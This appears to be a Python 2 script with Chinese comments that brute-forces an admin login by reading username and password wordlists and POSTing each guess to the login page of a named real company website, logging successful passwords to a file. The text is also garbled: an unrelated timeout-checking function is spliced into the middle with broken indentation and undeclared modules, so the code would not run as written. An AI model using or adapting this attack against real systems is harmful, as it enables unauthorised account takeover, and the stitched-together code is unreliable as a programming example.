#!/usr/bin/python
#coding=UTF-8

import httplib,urllib,time

fdictname=open("name.dic")
fdictpass=open("password.dic")                  #password.dic是你的字典文件，每行一条记录
name = 'name'
password='admin'                            #随便设置的初始密码
while name:
    name=fdictname.readline() 
while password:

        def timeout(site, timeout):
    save = socket.getdefaulttimeout() 
    try:
      response = urllib2.urlopen(site)
      socket.setdefaulttimeout(save)
    except urllib2.URLError, err:
      socket.setdefaulttimeout(save)
      if err.__class__.__name__ == "URLError":
        if isinstance(err[0], socket.timeout):
          return True
      return False
    if timeout("http://www.ahlinux.com/index.php", 10):
       print "Timeout detected"
        #判断连接状态
        password=fdictpass.readline()           #每次读取一行数据
        time.sleep(1)                      #防止提交过快
        httpClient=None

        try:
                params=urllib.urlencode({'action':'login','name':name,'password':password})         #这里就是我们刚刚通过chrome得到的字段,password作为变量。
               #下面就是HTTP头的一些信息，从chrome中得到的，直接拿过来用
                headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "application/xml, text/xml, */*; q=0.01",'User-Agent':'Mozilla/5.0 AppleWebKit/537.36','Referer':'http://www.opple.com.cn/admin/'}
                httpClient = httplib.HTTPConnection("www.opple.com.cn", 80, timeout=30)
                httpClient.request("POST", "/admin/Login.do", params, headers)

                response = httpClient.getresponse()
                responseread=response.read()                                      #获取返回信息
                if 200 == response.status and -1 != responseread.find('1'):    #这里就是判断返回状态，HTTP 200代表访问成功，从返回的数据中查找字符1，判断是否成功
                        fresult=open("result.log","a")
                        fresult.write(password)
                        fresult.close()
        except Exception, e:
                print e
        finally:
                if httpClient:
                        httpClient.close()
fdictpass.close()